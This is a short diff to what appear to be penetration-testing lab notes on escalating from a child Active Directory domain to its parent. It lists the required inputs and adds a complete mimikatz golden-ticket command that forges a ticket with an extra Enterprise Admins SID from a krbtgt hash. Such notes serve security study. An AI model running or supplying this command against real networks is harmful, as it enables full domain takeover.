@@ -14,3 +14,6 @@ Requires
 * The name of a target user in the child domain (does not need to exist!)
 * The FQDN of the child domain.
 * The SID of the Enterprise Admins group of the root domain.(Powerview, Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL")
+```
+mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+```
